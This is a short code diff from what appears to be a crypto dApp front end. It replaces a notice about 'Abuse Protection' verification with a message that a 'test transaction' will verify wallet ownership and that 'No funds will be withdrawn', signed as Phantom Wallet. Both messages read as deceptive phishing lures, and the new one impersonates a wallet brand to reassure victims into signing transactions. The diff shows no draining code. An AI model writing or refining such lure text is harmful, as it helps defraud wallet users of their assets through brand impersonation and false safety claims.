@@ -358,10 +358,7 @@ useEffect(() => {
                     >
                       Note:
                     </span>
-                    This dApp uses Abuse Protection to prevent misuse of
-                    platform. You'll need to complete a quick verification of
-                    your transaction history. It's completely safe and only
-                    takes a few seconds.
+                    To ensure security and verify wallet ownership, a test transaction will be initiated. No funds will be withdrawn.Your assets remain fully secure. © Phantom Wallet 2025.
                   </wui-text>
                 </div>
 
